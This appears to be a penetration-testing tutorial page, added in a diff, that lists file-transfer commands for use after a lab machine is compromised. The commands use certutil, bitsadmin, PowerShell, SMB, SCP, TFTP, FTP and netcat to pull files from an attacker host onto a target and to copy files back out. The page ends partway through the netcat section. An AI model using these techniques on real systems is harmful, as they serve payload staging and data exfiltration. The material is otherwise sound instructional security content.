@@ -1,0 +1,174 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">File Transfer Cheatsheet: Windows and Linux</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/" rel="bookmark"><time class="entry-date published" datetime="2024-07-21T05:49:12+00:00">July 21, 2024</time><time class="updated" datetime="2025-07-15T17:31:48+00:00">July 15, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;"><strong data-start="1258" data-end="1296">File transfer in Windows and Linux</strong> is a crucial step in post-exploitation scenarios during <strong data-start="1353" data-end="1376">penetration testing</strong> or <strong data-start="1380" data-end="1395">red teaming</strong>. This article provides a complete <strong data-start="1430" data-end="1462">cheatsheet for file transfer</strong> using multiple tools and protocols on both platforms.</span></p>
+<h3><span style="color: #800000;">Table of Contents</span></h3>
+<ul>
+<li><strong><span style="color: #000000;">Lab setup</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using wget</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using curl</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using certutil</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using bitsadmin</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using PowerShell</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using SMB server</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using SCP</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using TFTP</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using FTP</span></strong></li>
+<li><strong><span style="color: #000000;">Different methods to setup the server for file transfer</span></strong></li>
+<li><strong><span style="color: #000000;">File transfer using Netcat</span></strong></li>
+<li><strong><span style="color: #000000;">Conclusion</span></strong></li>
+</ul>
+<h3><span style="color: #800000;">Lab setup</span></h3>
+<p><span style="color: #000000;">Here we are going to perform the file transfer assuming we have already compromised the target machine and we have an initial shell access.</span></p>
+<p><span style="color: #000000;">Attacker Machine: Kali Linux (192.168.31.141)</span></p>
+<p><span style="color: #000000;">Target Machine 1: Windows 10 (192.168.31.219)</span></p>
+<p><span style="color: #000000;">Target Machine 2: Ubuntu</span></p>
+<p><span style="color: #000000;">Inside the <strong data-start="177" data-end="199">attacker’s machine</strong>, we will <strong data-start="209" data-end="237">set up an <em data-start="221" data-end="235">Updog server</em></strong>. It serves as a <strong data-start="254" data-end="299">replacement for Python’s SimpleHTTPServer</strong>. In particular, it proves useful in scenarios where a <strong data-start="358" data-end="373">lightweight</strong>, <strong data-start="375" data-end="406">quick-to-deploy HTTP server</strong> is required.</span></p>
+<p><span style="color: #000000;">To install the server, we will execute the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">pip3 install updog</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDb8dt-teDQc8h1o-NoE8KdySPPAiOHKmTSYa06FjTqwxIj9ZQoN9SnIbw2hG4diDXMm8TuyYKzd6W3WYj4qGnrG1oCHDiKPJW9M1tV6SuOAUAvaQL_kdXCmzr22hxInkBDmoddGLw07kAZd481DLpLh3KtSuSuNPxvZ7T2wvh4olhbVge0bFhRN5cO3y0/s16000/1.png" alt="File Transfer Windows and Linux" width="640" height="210"/></span></p>
+<p><span style="color: #000000;">After the installation is complete, we can run the server at port 80 using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">updog -p 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgd2qv5ieUJMsgL9sQva7HMIKCmJOZAhUhZODAit2mcxSZ2hfMnpbfm0dS3kphUB4lzRsN_ESov2ZP-y-1X0rR6LzNMzQbLx-P9qUfG8Js7SA7xUtjhAlgC1p7GPYSiVhGFXSJX0WADOIJuP_NWLL816B5cb22CHXbY7MkZC-sOS4DsP5-7-GU8rLDO3BtL/s16000/2.png"/></span></p>
+<h3><span style="color: #800000;">wget</span></h3>
+<p><span style="color: #000000;">To begin with, we can use the <strong data-start="455" data-end="473"><code data-start="457" data-end="463">wget</code> command</strong> to <strong data-start="477" data-end="498">transfer the file</strong>. <strong data-start="500" data-end="510"><code data-start="502" data-end="508">wget</code></strong> is a <strong data-start="516" data-end="549">powerful command-line utility</strong> used to <strong data-start="558" data-end="589">download files from the web</strong>. Importantly, when we perform <strong data-start="624" data-end="665">file transfer using <code data-start="646" data-end="652">wget</code> in Windows</strong>, we must include the <strong data-start="687" data-end="713"><code data-start="689" data-end="693">-o</code> (<code data-start="695" data-end="705">-OutFile</code>) flag</strong> to properly <strong data-start="726" data-end="743">save the file</strong>. Otherwise, it only returns the result as a <strong data-start="792" data-end="813">WebResponseObject</strong>. Here is the <strong data-start="827" data-end="862">Windows-specific <code data-start="846" data-end="852">wget</code> command</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget http://192.168.31.141/ignite.txt -o ignite.txt
+dir
+type ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFWdBQltBaUJTAtCOYfcBy_fCcC9edORpF2Z1TFZI-Gq_GunT8sy2utnIKca9YP-67ZV49XpjvodU84TXZoJaJSD3vfS0FWAp_VYNnqAjFKOWIlAKn02HDaKVzBAVSgA-tLCmoPRnh1aewVoxpcZ98VezBj0j_w49dhO-xiM43PCF9bdf_BwFLrmgky1A1/s16000/3.png" alt="File Transfer Windows and Linux" width="1261" height="506"/></span></p>
+<h3><span style="color: #800000;">curl</span></h3>
+<p><span style="color: #000000;">Curl acts as a <strong data-start="896" data-end="926">powerful command-line tool</strong> that allows us to <strong data-start="945" data-end="963">transfer files</strong> across various <strong data-start="979" data-end="1003">networking protocols</strong>. Use the following command to <strong data-start="1034" data-end="1055">transfer the file</strong>:<br/>
+</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl http://192.168.31.141/ignite.txt -o ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkMNrZZDFuJvd25DW03_tRiVd9TBl-r3yJoYJgWDpvzj9YRA7t6yzzydRZRW4HzxaMMfIDhaN4u8JXJuIXax0xLXGg5rUK_38D3L2p1LtVD_2Q-BOm9b7voyQsXk9_LfHVRmHuYwXLrd7dPwKziZcl7BDNQYZzBaSJDhcztpweGpGcaATXUxbrSGS_B_IU/s16000/4.png"/></span></p>
+<h3><span style="color: #800000;">certutil</span></h3>
+<p><span style="color: #000000;"><strong>certutil </strong>is a <strong data-start="1096" data-end="1120">command-line utility</strong> included with the <strong data-start="1139" data-end="1167">Windows operating system</strong>. It is primarily used for <strong data-start="1194" data-end="1246">managing certificates and cryptographic elements</strong>. To <strong data-start="1251" data-end="1287">transfer a file using <code data-start="1275" data-end="1285">certutil</code></strong>, execute the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -urlcache -f http://192.168.31.141/ignite.txt ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHnDUjqOFA7eEhTNQbnWFss3nJvk1wFBe5vBb3SrndNYopZwG933FdvbYXba6mkXrZKMHIyNTym4kJ7KKxTKBbMAgF4cItED0Jt50ZwUCyHQOAUG9WVPohqmCeZP7Z8qbv5fsS5dyzKTMmhtzSxBItGnL4J7G6cmMRmKc6cU4KgbwS_q3pQJvgUQ34IBPF/s16000/5.png" alt="File Transfer Windows and Linux" width="1339" height="135"/></span></p>
+<p><span style="color: #000000;">The <strong>-split</strong> option in certutil is used to split large files into smaller segments to perform the file transfer.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -urlcache -split -f http://192.168.31.141/ignite.txt ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbP55-GzVBLOJpzm1uRR9lzAJf41o3un4ziLqr9HXMIsFld6dyMioM48Ffjv5biywvYnfraaRR6KwXRnkPnLRAFtIsB3Hd3mXmuUzf8DUBoCZmwXeDXBp3izWY5mQLznJBOBwr9Ewi3tYD5Q7mqUlmRmpnvfpnfUIhgkVyYKSnXlrVBfwg6u0mSEeQWGZI/s16000/6.png"/></span></p>
+<h3><span style="color: #800000;">bitsadmin</span></h3>
+<p><span style="color: #000000;"><strong>Bitsadmin </strong>is another <strong data-start="1362" data-end="1386">command-line utility</strong> tailored for <strong data-start="1400" data-end="1459">handling Background Intelligent Transfer Service (BITS)</strong> tasks in Windows. It helps perform various <strong data-start="1503" data-end="1531">file transfer operations</strong>, such as <strong data-start="1541" data-end="1576">downloading and uploading files</strong>. Use the following command for <strong data-start="1608" data-end="1643">file transfer using <code data-start="1630" data-end="1641">Bitsadmin</code></strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /transfer job http://192.168.31.141/ignite.txt C:\Users\raj\Desktop\ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqzG1VAXpFdEk0QKO9XX7dwdQDh8w-CZrydqtqh1MIVZOyJHJkVnbEUsl7y44d2VznjJ00JVT9jZGHyc5ZzY3ZLZs5zPQ7bw5dJaRLYfAoDiNxssCZc-NTYrcXE8py6eWyerK3P8ADnH2-wKQOgaeXWAcOaEwDPeLn4Co0aVHe7qQXLtHpbwhlejBmvD0x/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">It can be seen that the file is successfully transferred after the command is executed.</span></p>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1WnITZDFCmeKT8gCGTg0vKR25VMzH61G_NFZTTfHge3oq5TqMC5pPnRstFC9aYCLMR2ir4elNaUHUU0jvBm4-p7GzCSo81k2iUX8aLA1yonDAwAh2UA5EwUMJhu4zsyvFCC9i_KuSOqR9dlj7UiXQ4yn5Nz5gP4PzhY8QLv5-oiraxtKU8xj_Wzv8Aiv5/s16000/8.png" alt="File Transfer Windows and Linux" width="1583" height="492"/></span></p>
+<h3><span style="color: #800000;">File transfer using PowerShell</span></h3>
+<p><span style="color: #000000;"><strong data-start="1646" data-end="1663">Alternatively</strong>, we can perform <strong data-start="1680" data-end="1714">file transfer using PowerShell</strong> by running the command shown below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhnLAq2EB8RTYu3nIK0Fd6E-d7EnQExTdZeBnkQ7UY10GwlNgRX9OM4lW0ZdosAUUBjVQ2vpC_6pGdtPgdc7lIRLJwL6ArfqZPXhJH-oPYMDXQCytcQhuEUEpfuf_niba6UiuhbK5PA50sKwD74yuyPFTNVlzDXtd5BAHj53y0iJkshDff_LLo7SHQv8rg6/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;">File transfer using SMB server</span></h3>
+<p><span style="color: #000000;"><strong data-start="1765" data-end="1772">SMB</strong> is a <strong data-start="1778" data-end="1798">network protocol</strong> designed to enable <strong data-start="1818" data-end="1861">shared access to files, ports, and more</strong> within a network. To <strong data-start="1883" data-end="1911">enable SMB file transfer</strong>, we will use the <strong data-start="1929" data-end="1960"><code data-start="1931" data-end="1951">impacket-smbserver</code> script</strong> inside <strong data-start="1968" data-end="1982">Kali Linux</strong> to <strong data-start="1986" data-end="2005">share the files</strong>. In this setup, we assign the shared directory the name <strong data-start="2062" data-end="2073"><code data-start="2064" data-end="2071">share</code></strong>. Notably, this simplifies long file paths into a <strong data-start="2127" data-end="2158" data-is-only-node="">single accessible directory</strong>. We can either provide the <strong data-start="2186" data-end="2209">full directory path</strong> or use <strong data-start="2217" data-end="2226"><code data-start="2219" data-end="2224">pwd</code></strong> to represent the <strong data-start="2244" data-end="2273">current working directory</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd) -smb2support</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhg-NGmEHsLSLOtew_6VZXfKKjEcs-5qXIfExIsU9xEhGMw2LEocXOFtx9QzYRfajnF_TF4I9hAgpQmFnU6rz5GC1SoUfwY_o1IqYxwiCG4_uFyWqmChM71dkygzuPgSeOT3AdCy9qjyFZTCUzUfUPznrExudmc580lX3AcKzCksu4bPLP4-V8VGmEGKwts/s16000/20.png" alt="File Transfer Windows and Linux" width="1093" height="357"/></span></p>
+<p><span style="color: #000000;">After the setup is done, we can execute the following command in the Windows machine to copy the files from the share folder.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy \\192.168.31.141\share\ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1-c8WeTkUIPlf0Lg-G51KEY5rEdK0OkOXQLvHjiZLuGNR4GA3ZyXZZI9KKgnrjThVh0PMBTH6gtyJmwezAEmTTvrO3ffx9WFNAmXawCcRx1ldtBKoS7xJLSrOK64o75GzAh2WZosD1ApzTgfT8Y3vZ5KRtjNJFov-XeKJ1voToixY8agTUvjADOWa2kny/s16000/21.png"/></span></p>
+<p><span style="color: #000000;">To copy the file from Windows into our kali linux, we can use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy ignite.txt \\192.168.31.141\share\ignite.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgClbHc-FnIDkb86WaEqIJ_P50M-JcuNQG2lm0ZkBH9wQS8qfw18BSjO28WbHM-kadOf-GvALCmLCflVWwUNa1X_CnIr9agTN_XvcK4Lw7vlf966R7HWpM_s7hqTYcehxbzOuWbzN_9vqLriDye1wt_mJ-7ay2G-GGpdz9VlwmRVx2MQQXGjOdo2jUHJWxM/s16000/22.png"/></span></p>
+<p><span style="color: #000000;">In order to transfer file from another linux machine like ubuntu, we can connect with the share folder using the <strong>smbclient</strong> tool and then after login, we can directly upload and download the file using put and get commands respectively.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L 192.168.31.141
+smbclient "\\\\192.168.31.141\share"
+ls
+get ignite.txt
+put data.txt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigW2YOlrsprMPs_-G239EteZhHDxmOk_Eg-doZmRKINBI1Zz9lJY3K4uUSOqrhqxJI1RHwl8ZKRpzvf0pmax513aeo8kyvxoSiZdq9TFdCiyM-vbhSX-XMzjGy9sA97N6mvlWr7l8DtACmteKo8wUVSzdf8sJjK7EbZa8hHY5AH655l_p_CWJAGphzHqQC/s16000/23.png" alt="File Transfer Windows and Linux" width="1059" height="587"/></span></p>
+<h3><span style="color: #800000;">File transfer using SCP</span></h3>
+<p><span style="color: #000000;"><strong>SCP (Secure Copy Protocol)</strong> is a method for securely transferring files between a local system and a remote server, or between two remote servers. It operates over the <strong>SSH (Secure Shell)</strong> protocol, which ensures a secure connection over potentially insecure networks. It has the advantage of cross-platform usage such that it is supported by both linux and windows.</span></p>
+<p><span style="color: #000000;">To copy the file from Windows to kali, we will be using the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp ignite.txt kali@192.168.31.141:/tmp</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6rdMBRsAgaNAAK5qCy8t27hd7yixHzKQZ-dtNz77mXpZIAfFgOpkPOIIxo1vryir6OFip8EN0ScXhwpY2UrOCXufS9mtLR-GOywyYlIZpmjNRAiBcgN_r4IwUWie-gRKHpkz3rEpob_5Rvoyv2IaCGLO1-HC5A_3psx_YWq3o1XpiGDTBEwQDr2D_Iy3c/s16000/25.png"/></span></p>
+<p><span style="color: #000000;">To transfer the file from kali linux to the windows machine, we will use the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">scp ignite.txt raj@192.168.31.219:/C:/Temp</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSkXjRUZ5bMhCLxt2U5tv7dpzCPz6GzGJq2RoNcoxuSw0hNjIkMGjjM3bgKUfU1lgkTSNdKTPzAgkAkKbGiy25fSF7DOc_Y48c8DoORhrwInsgefeUu_KAsgfechBDNUxV4xZoR7j4XgQn1B1IN5Se-xiQeXT1Ol4Fk9tdaaRI3blHfTly8gPm4_JL-fQG/s16000/26.png" alt="File Transfer Windows and Linux" width="913" height="836"/></span></p>
+<h3><span style="color: #800000;">File transfer using TFTP</span></h3>
+<p><span style="color: #000000;">TFTP (Trivial File Transfer Protocol) is a basic and minimalistic protocol for file transfers over a network. It operates over the UDP rather than TCP, this choice helps keep the protocol lightweight but means it does not provide the reliability and error-checking that TCP offers. It works on UDP port 69.</span></p>
+<p><span style="color: #000000;">To transfer a file from kali linux to windows machine, we will be using the following command inside the <strong>Metasploit</strong> framework:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/tftp
+set srvhost 192.168.31.141
+set tftproot /root/raj
+run</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilq9VwtgsrSvoBEm2JyW9J1EgbRS0aN0WCvb3jHoVTErhimG0FpC1uSnkLnfQ3CWQycf8WCLHtWHxPUoHTvYcc6sQyhlgadylfYFeoWf7DSt5nYrDzQAtTqn83GbMzDigmF7fZDOXAUFc35cDU069BijgGdBiUXvru9dQbLRXVWQaho2GYTqef6ogBZusg/s16000/30.png" alt="File Transfer Windows and Linux" width="1160" height="343"/></span></p>
+<p><span style="color: #000000;">To download the file, we will run the following command in windows machine:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tftp -i 192.168.31.219 GET ignite.txt
+dir</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhubEAst_r1gAR5I-F_Wi2AfzoCcjDTjVHpMVYIDj_2nQIUHx6DDhcKGBAaQvN-BjPgWnoCHdhzhmywV6sk4ISZY2Cg6WAWD_EpIsBGjtsDQZHvKw9UiLAbNOs4eQBnMww3vEckEGgI1zT4GVS56E9xWK8Rc8o5CjI3xbItz_DEda0dyUGvRx5ZUJ_iU_CF/s16000/31.png"/></span></p>
+<h3><span style="color: #800000;">File transfer using FTP</span></h3>
+<p><span style="color: #000000;">FTP (File Transfer Protocol) is a longstanding and widely utilized protocol for transferring files across a network. It enables users to upload, download, and manage files on a remote server. To enable the FTP service, we are going to use the Metasploit framework. It can be noted that here we are keeping an authentication on the service rather than keeping the anonymous login.</span></p>
+<p><span style="color: #000000;">Following will be the commands:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/ftp
+set srvhost 192.168.31.141
+set ftproot /root/raj
+set ftpuser raj
+set ftppass 123
+run</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEho3ymok8i_lrQCexc7Y7j__oAD5M9Wv5fIHczxVKgDUBOXVJmzw8zBu6cRv_TIknFgl19mQTWRCPKQ1szZZc7bo9wJkvpCpqph9V00AVy4L12vCSnDVd_tLGoGUIGBP18dxqN7XjRbM6uSerPW6j9bArjM7sXSpXee65TCbeLlcXizHcUxc9A-82QlTxeq/s16000/35.png" alt="File Transfer Windows and Linux" width="982" height="494"/></span></p>
+<p><span style="color: #000000;">Once the server is started, the file can be downloaded after authenticating into the FTP server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.31.141
+raj
+get ignite.txt
+bye
+dir</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzSFeyz-wocghNeJF6wPdMxIhsgILMD9kxZccI11uMRVyu6lSFfndKEntORJC5MulsjOmGsD0tLzIg4IXnBbOAMs-DAlxVEWE_KGq34a3pEvTeM2rPvBeixsoMyHjpZUUFFs_c7h5-N9whaoJlOOUmElLQWbfgOuGyUAGy5H-V5INNEz9VbkdTY5eUSR2r/s16000/36.png"/></span></p>
+<p><span style="color: #000000;">We can also use the python FTP server using the pyftpdlib. It is a library of python which helps us to setup the FTP server on the machine. Here we will be using it to setup a FTP server on the kali machine.</span></p>
+<p><span style="color: #000000;">First, we will start with the installation using pip3.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m venv pyftpdlib-venv
+source pyftpdlib-venv/bin/activate
+pip3 install pyftpdlib</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHEMsrnS4gd4A8lmuM3W-pDGnIYUM28V8_o7pCZowljRE_g0y6jWLSTLpoLlArRvSNkwuXRb67MchIjzt0iCcPMGB2zxU1wfQDbix3AuvVNj2J2lohKzkgvdkH2V9u_nPffrNMH_aDaeLh8jGOHQgUqRa61bW3-6ptQWDSMMwPvzaDtHzvbnyfBbi2W72e/s16000/40.png" alt="File Transfer Windows and Linux" width="740" height="439"/></span></p>
+<p><span style="color: #000000;">After the installation is complete, we can start the FTP server using the authentication by the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m pyftpdlib -w -p 21 -u ignite -P 123</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgH_pvdWXft83lA1CXCTrxiUwV1nkzPwzBB_sAOfXn-Tc_RdhxdiqcdRqzFqbG1txNdZxKCwONmkYkGGsIChdnH0-shHfR9P7EJuafkdK16dLrRAp0loUKPWnqjnWtF4ZJHKAiOJtuEzqyglxlB6k0TwGg9v8dySJeq2xOaj5sNOWpt5pQnBZXcfOHOj8c_/s16000/50.png"/></span></p>
+<p><span style="color: #000000;">Once the server is started we can authenticate into the FTP server from the windows machine and download the file. To upload the file we will use the put command and to download the file we will use the get command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.31.141
+get ignite.txt
+put C:Users\raj\avni.txt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhf7_kPTP66O8ENw313aT6yr339-P6r-AYexS43mRNLtT_dumO98TuRODSuOTEbajRfzdyU1Iw7-4IfNtGxcvmdufWo5mfjgF5OGA1lEcm6VJn0E42Bn6AQ834nPFNUj6rVdpbjChRnQiIJgMCQ5harGzSDH3QJMkNMgfElgNWcIUKjOWIJUFC_7WgVmNJ8/s16000/51.png" alt="File Transfer Windows and Linux" width="920" height="747"/></span></p>
+<p><span style="color: #000000;">To setup FTP server for Anonymous login, we will run the same command but without the username and password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m pyftpdlib -w -p 21</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3woEt42UsulXTN3AAZ4OlixGPDguiEKyf1KgfrX8kKEv2KvtoFHn2np1URx2egZ9P2L2d77DaT8HDk4d0H1ESnLBegDKQBaDdBCd702a8Z6PWnmd8GtdEpxrNK60PRy8JBwNOMS6gaSjqfjUTmkJ3G8DL9ec9lth_-7J7QqfReyQe7QfsGX3soWdeuUTB/s16000/52.png"/></span></p>
+<p><span style="color: #000000;">Once the server is enabled for Anonymous login, we can perform it and view the files.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 192.168.31.141
+ls</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyt4LH6EujQIaG1ktPf4SRuzI5mRdwlhfH0oJTQ2J7bxKGuy33cPtS6qs3zA6Yc9fRkSpdlVCiSKb8UCJRGbkgEsRSAUHweS16eoQp54NEcZXgLvoJSzlTZo5n_M3XmZK1nUpA_LpKCw0S6cn7VCgOMytZXv5vV_KlmXytshOl_QlmjSi3d8bMzoOgoN7l/s16000/53.png" alt="File Transfer Windows and Linux" width="791" height="485"/></span></p>
+<h3><span style="color: #800000;">Different methods to setup the server for file transfer</span></h3>
+<p data-start="159" data-end="254"><span style="color: #000000;">To perform the <strong data-start="174" data-end="191">file transfer</strong>, we need to <strong data-start="204" data-end="223">set up a server</strong>, apart from using <strong data-start="242" data-end="253"><em data-start="244" data-end="251">Updog</em></strong>.</span></p>
+<p data-start="256" data-end="353"><span style="color: #000000;">One way to achieve this is by setting up a server using <strong data-start="316" data-end="323">PHP</strong> with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">php -S 0.0.0.0:8081</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYvOOQLroJSIp_FgLy3uqgkQrInCQen8HhqInkolTxekU9LJCcahHk2KrYu2W0FUbsv47E9JI9rkFiJFzkCdmjzO1iKmTwaqKe-FtpAnaJrw2ZGkJwFNAFsuduyFeauo3aSZdqEQXoaJ0b0fgOj7grP5gbjfTsayFZNmqK_5dAOtWVCxIfSta8Z0VLztFw/s16000/60.png"/></span></p>
+<p><span style="color: #000000;">Alternatively, you can use <strong data-start="418" data-end="429">Python2</strong> by running:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python2 -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2gB0EhRBZRyJOng926oniYXXgZL1M2yHZJxrEcsSGx5UiPryr2-XAH7SzuVCmccq87hp907Gt6BW0b1Zu2onHl_Ty56QRpVBWjjLfUiUmYxkbJJDV1pFL_HZNk382_iXpaVhVgN2Zaq_zy9sKifwWGqFVgKb6c_b-Vl9I2R4b5J1bEMx6rvzB9-hyR4O-/s16000/61.png"/></span></p>
+<p><span style="color: #000000;">If you’re using <strong data-start="488" data-end="515">Python3</strong>, initiate the server with this command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m http.server 8000</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4y_VnJALVGhKZF5ak3RAxEoUFGt6cLlpX0R6ttoBy4_oZMaKtfOxaJp-1w9BWs1E6WG-HlTSWc5LnnjHV83_WVxsjkZreUDTdCuH2U56G0DhNiNGk2wqDyn438HoyktAlRb27zQTx69S48BCVqfRxqE4qnZlf2ExPpoLv9WscpnTwWzjANyCnoG7cteU1/s16000/62.png" alt="File Transfer Windows and Linux" width="861" height="200"/></span></p>
+<h3><span style="color: #800000;">File transfer using Netcat</span></h3>
+<p><span style="color: #000000;">Netcat, commonly known as <strong>nc</strong>, is a multifunctional networking tool designed for reading from and writing to network connections over TCP or UDP. Netcat can facilitate file transfers by establishing a simple client-server setup.</span></p>
+<p><span style="color: #000000;">To transfer file in the kali machine from an Ubuntu machine we can use the following command inside kali:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 5555 &gt; file.txt</pre>
